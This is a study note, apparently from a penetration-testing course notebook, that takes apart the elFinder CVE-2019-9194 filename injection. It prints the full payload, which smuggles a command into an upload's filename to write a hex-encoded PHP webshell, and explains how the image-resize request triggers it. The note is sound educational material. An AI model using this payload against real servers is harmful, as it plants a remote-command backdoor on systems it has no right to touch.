# File Upload Attacks, Command Breakdowns

Part of [[COMMAND BREAKDOWNS]]. Filename-based injection tricks, distinct from the file-content/extension-filter bypasses that would live in an upload form itself. No matching [[COMMAND APPENDIX]] area contains this specific technique yet, syntax lives inline in [[Fixing Exploits]] directly. See [[COMMAND BREAKDOWNS]] for the entry format.

---

## elFinder CVE-2019-9194: shell metacharacter injection via the uploaded filename

**Full payload:**
```python
payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'
```

**Piece by piece:**
- `SecSignal.jpg` — the filename *looks* like an ordinary, harmless JPEG name, this matters for any filter that only inspects the file's apparent name/extension.
- `;` — a shell metacharacter, command separator. This is the actual vulnerability: elFinder's PHP connector eventually passes the uploaded file's name into a **shell command** (during a later image-processing step, not at upload time itself) without sanitizing it first. Anything after this `;` runs as a completely separate OS command.
- `echo 3c3f...0a | xxd -r -p > SecSignal.php` — decodes a hex string back into raw bytes and writes them to a new file. The hex decodes to `<?php system($_GET["c"]); ?>\n`, a minimal one-line PHP webshell. Hex-encoding the payload here sidesteps having to smuggle literal `<`, `?`, `$`, `"` characters through whatever escaping/quoting the filename field itself goes through on the way into the vulnerable shell command.
- `;echo SecSignal.jpg` — a second injected command, its only purpose is to make the **last** thing printed/returned by the whole malicious "filename" still look like `SecSignal.jpg`. Depending on how the connector uses the command's output afterward (e.g. logging, or constructing a response), this keeps the apparent filename looking legitimate end to end.
- **The trigger is separate from the upload.** The upload itself (`upload()` in the exploit) just gets the malicious filename stored, nothing executes yet. A **second request**, elFinder's own image-rotate command (`cmd=resize`), is what actually invokes the vulnerable shell command against that stored filename, that's the moment the injected `;echo|xxd...` segment actually runs and the webshell gets written to disk.

**Where this comes from:** documented on both **PayloadsAllTheThings**' file upload page ("Filename Vulnerabilities" section, `; sleep 10;`-style filename command injection, verified live) and **HackTricks**' file upload page (`Set filename to ; sleep 10; to test command injection`, via the GitHub source mirror since the live HackTricks site is currently paywalled). CVE-2019-9194 itself is elFinder-specific, but "attacker-controlled filename ends up inside a shell command during some later processing step, not at upload time" is a broader, reusable pattern worth checking for on any file-upload feature that does post-upload processing (thumbnailing, format conversion, virus scanning via a shelled-out CLI tool, etc).

**Where to look in the response:** the initial upload response is just JSON (`{"added":[{"hash":...}]}`), nothing suspicious visible there. The actual proof only shows up after the *second* request (the resize/rotate trigger): either an HTTP error if something went wrong, or, on success, the dropped webshell simply becomes reachable at its (now-real) filename on the next request.

🔁 **Seen in:** [[Fixing Exploits#Module Exercise VM #2: elFinder web application|Fixing Exploits, Module Exercise VM #2]]. Same underlying category of bug (trusting attacker-controlled input that ends up inside a shell command) as [[Common Web Application Attacks#9.4.1. OS Command Injection|Common Web Application Attacks, 9.4.1]], just delivered through a filename field instead of a form parameter.

#### Tags: #ElFinder #CVE20199194 #FilenameCommandInjection #HexEncoding #CommandBreakdowns

---

## **Outstanding**
This area grows alongside the modules, currently the only entry, revisit once more file-upload-specific techniques (extension/MIME filter bypasses, polyglot files) show up in a module rather than a box writeup.
